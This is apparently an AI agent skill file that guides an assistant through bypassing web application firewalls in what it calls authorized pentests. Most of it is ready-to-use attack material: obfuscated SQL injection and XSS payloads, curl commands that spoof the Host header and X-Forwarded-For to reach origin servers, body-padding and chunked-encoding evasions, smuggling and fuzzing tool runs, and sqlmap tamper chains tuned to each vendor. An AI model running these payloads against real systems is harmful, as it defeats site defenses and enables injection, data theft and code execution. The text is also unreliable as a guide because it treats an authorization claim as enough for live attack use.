---
name: waf-bypass-techniques
description: WAF fingerprinting and bypass specialist for authorized pentests — covers WAF identification (wafw00f, behavioral), misconfiguration-first bypass, lexical obfuscation (URL/double/Unicode/hex/case/whitespace), structural obfuscation (comments, concatenation), protocol-level bypass (HTTP/2, chunked, smuggling), body-size inspection gaps, and origin-IP exposure. Use when a WAF is blocking injection payloads (SQLi, XSS, RCE, SSRF). Triggers on: WAF bypass, cloudflare bypass, AWS WAF bypass, imperva bypass, modsecurity bypass, encoding bypass, waf evasion, payload blocked 403.
---

# Skill: waf-bypass-techniques

## Trigger

Fire when:
- An injection payload (SQLi, XSS, RCE, SSRF, XXE) returns 403/406/503
- A WAF vendor needs to be identified before crafting payloads
- Encoding or obfuscation is required to pass the perimeter
- HTTP/2, chunked encoding, or smuggling bypass is needed
- Origin IP needs to be discovered to bypass CDN/WAF entirely

## Instructions

### The Fundamental Principle

> A bypass exists when the WAF and the backend interpret the same request differently (parser discrepancy), or the WAF simply does not inspect that part of the request (inspection gap).

Every technique below is an instance of one of these two root causes.

### Phase 0 — The 9-Step Bypass Playbook (Quarkslab discipline)

```
Step 1: Fingerprint the WAF
        → wafw00f, response headers, error-page content, timing delta
Step 2: Probe — map which payloads get blocked and with what codes
        → 403 / 406 / 503; vary method, path, body independently
Step 3: Try MISCONFIGURATIONS FIRST (no obfuscation traces)
        → Direct origin exposure (hit origin IP with spoofed Host:)
        → X-Forwarded-For: 127.0.0.1 / X-Real-IP: 127.0.0.1 spoofing
        → Body-inspection size limits (prepend >8KB junk before payload)
Step 4: Search before crafting
        → Dorks: site:github.com "[WAF vendor] bypass"
        → HackerOne/Bugcrowd disclosures for that vendor
Step 5: Isolate — strip to minimum payload
        → Binary search: find the EXACT blocked token
Step 6: Obfuscate that token
        → LEXICAL first (cheapest): URL/double/Unicode/hex/case/whitespace
Step 7: Layer — add second/third obfuscation levels
        → STRUCTURAL: comments, concatenation, char-code reconstruction
        → PROTOCOL: chunked splits, HTTP/2 framing, Content-Type swap
Step 8: Validate — the payload MUST EXECUTE on the backend
        → Results reflected, OAST callback, DB error, SSRF ping
Step 9: Iterate — each new block reveals a new inspection surface
```

### Phase 1 — WAF Fingerprinting

```bash
# wafw00f (BSD-3-Clause, canonical tool, 150+ WAF signatures)
pip install wafw00f
wafw00f https://target.com
wafw00f -a https://target.com   # try all WAFs even after first match

# Manual behavioral fingerprint
# 1. Send baseline: GET /hello HTTP/1.1
# 2. Record: status, headers, body size, response time
# 3. Send trigger: GET /?q=<script>alert(1)</script>
# 4. Compare:
#    "Cloudflare" in body → Cloudflare WAF/CDN
#    "Incapsula incident" → Imperva
#    "XXXXXXXX.compute.amazonaws.com" → AWS WAF behind ALB
#    "ModSecurity" / 406 Not Acceptable → ModSecurity
#    "Sucuri WebSite Firewall" → Sucuri
#    Timing delta >200ms on blocked vs clean → active inspection
#    ~0ms + 403 → pre-computed block list
```

### Phase 2 — Misconfiguration Bypass (always try first)

```bash
# 1. Origin IP discovery → bypass WAF/CDN entirely
# CloakQuest3r (cert transparency + DNS history)
git clone https://github.com/spyboy-productions/CloakQuest3r
python3 CloakQuest3r.py --domain target.com

# Once origin IP known: spoof Host header
curl -H "Host: target.com" http://<ORIGIN-IP>/vulnerable?id=1'--

# 2. X-Forwarded-For spoofing (WAF trusts header as source IP)
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" http://target.com/?id=1'--

# 3. Body size inspection gap (WAF stops inspecting after limit)
# Cloudflare: 128KB | AWS WAF: 8-64KB | Akamai: 128KB | Azure: 128KB
python3 -c "print('A'*8192 + '&id=1 UNION SELECT 1,2,3--')" | \
  curl -X POST http://target.com/search -d @-
```

### Phase 3 — Lexical Obfuscation

**URL Encoding**
```
SELECT → %53%45%4C%45%43%54
UNION  → %55%4E%49%4F%4E
'      → %27
<script> → %3Cscript%3E
Double URL encode: ' → %2527
```

**Unicode / UTF-8 variants**
```
UNION → \u0055NION → UN\u0049ON
' (apostrophe) → \u0027 → %ef%bc%87 (fullwidth)
<script> → ＜script＞ (fullwidth Unicode)
```

**Case variation**
```
uNiOn SeLeCt
UnIoN sElEcT 1,2,3--
```

**Hex encoding**
```sql
-- MySQL: 'admin' as hex
SELECT * FROM users WHERE username=0x61646d696e;
-- MSSQL: char() reconstruction
SELECT CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78)
```

**Whitespace substitution**
```sql
-- Replace space with: tab (%09), newline (%0a), carriage return (%0d), /**/
UNION/**/SELECT/**/1,2,3--
UNION%0aSELECT%0a1,2,3--
UNION%09SELECT%091,2,3--
```

### Phase 4 — Structural Obfuscation

**SQL comment injection**
```sql
UN/**/ION SEL/**/ECT 1,2,3--
/*!UNION*/ /*!SELECT*/ 1,2,3--
UNI/*comment*/ON SEL/*comment*/ECT 1,2,3--
```

**String concatenation (MySQL)**
```sql
CONCAT(0x61,0x64,0x6d,0x69,0x6e)  -- 'admin'
-- MSSQL:
'ad'+'min'
-- Oracle:
'ad'||'min'
```

**XSS structural bypass**
```html
<!-- Broken tag attributes -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<a href="javascript:alert(1)">x</a>
<!-- Event handler variations -->
<img src=x onERROR=alert(1)>
<svg onLoad=alert(1)>
<!-- Attribute quoting variations -->
<img src='x' onerror='alert(1)'>
<img src=`x` onerror=`alert(1)`>
```

### Phase 5 — Protocol-Level Bypass

**Chunked Transfer Encoding (split payload across chunks)**
```
Transfer-Encoding: chunked

4
UNIO
1
N
1
 
6
SELECT
0

```

**HTTP/2 header injection (matrixleons/Evilwaf)**
```bash
# Evilwaf: transparent MITM proxy + HTTP/2 SETTINGS/HEADERS rotation
git clone https://github.com/matrixleons/Evilwaf
# Route sqlmap/ffuf through Evilwaf proxy:
sqlmap -u "http://target.com/page?id=1" --proxy=http://127.0.0.1:8080
```

**Content-Type swap (WAF inspects JSON but not form data or vice versa)**
```
# Try all three if blocked:
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data; boundary=--boundary123
```

**HTTP Request Smuggling (PortSwigger/http-terminator)**
```bash
# defparam/smuggler (MIT) — quick CLI for CL.TE / TE.CL
pip3 install requests
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u "http://target.com/"

# PortSwigger http-terminator (AGPL-3.0) — AI-assisted desync research
git clone https://github.com/PortSwigger/http-terminator
cd http-terminator/seeker && pip install anthropic requests
# Runs seeker→flamer→validator→investigator pipeline
```

### Phase 6 — WAFFLED Academic Grammar Fuzzer (2025)

```bash
# sa-akhavani/waffled (ACSAC 2025 paper — discovered 1,207 bypasses across 5 WAFs)
git clone https://github.com/sa-akhavani/waffled
# HTTP/1.1 fuzzer with grammars for JSON, multipart, XML
# Targets parser discrepancies between WAF and backend
python3 waffled.py --target http://target.com/api --payload "' OR 1=1--" \
  --grammar json --mutations 50
```

### Phase 7 — sqlmap Tamper Scripts for WAF Bypass

```bash
# Top tampers per WAF (regaan/sqlmap-tamper-collection)
# Cloudflare
--tamper=space2comment,between,randomcase,charunicodeencode
# AWS WAF
--tamper=space2mysqldash,charencode,greatest
# ModSecurity (CRS)
--tamper=space2comment,modsecurityversioned,modsecurityzeroversioned
# Imperva
--tamper=between,bluecoat,charunicodeencode,space2comment
# Akamai
--tamper=charunicodeencode,space2comment,equaltolike
# Stack multiple:
--tamper=space2comment,between,randomcase,charunicodeencode,equaltolike
```

### Phase 8 — Payload Validation (mandatory)

A bypass is NOT confirmed until the payload executes on the backend:
- SQLi: DB error / data in response / time delay / DNS callback
- XSS: alert fires / DOM mutated / blind XSS platform callback
- RCE: command output in response / out-of-band callback
- SSRF: internal service response / Burp Collaborator / interactsh callback

## References

- yaklang/hack-skills waf-bypass-techniques — https://github.com/yaklang/hack-skills (2,521 stars, MIT)
- SnailSploit/Claude-Red offensive-waf-bypass — https://github.com/SnailSploit/claude-red (MIT)
- assetnote/nowafpls — https://github.com/assetnote/nowafpls (body-size inspection gap)
- sa-akhavani/waffled — https://github.com/sa-akhavani/waffled (ACSAC 2025)
- EnableSecurity/wafw00f — https://github.com/EnableSecurity/wafw00f (BSD-3-Clause)
- matrixleons/Evilwaf — https://github.com/matrixleons/Evilwaf
- defparam/smuggler — https://github.com/defparam/smuggler (MIT)
- PortSwigger/http-terminator — https://github.com/PortSwigger/http-terminator (AGPL-3.0)
- spyboy-productions/CloakQuest3r — https://github.com/spyboy-productions/CloakQuest3r
- regaan/sqlmap-tamper-collection — https://github.com/regaan/sqlmap-tamper-collection
- Source report: waf-phantom-deep-research-2026-10-27.md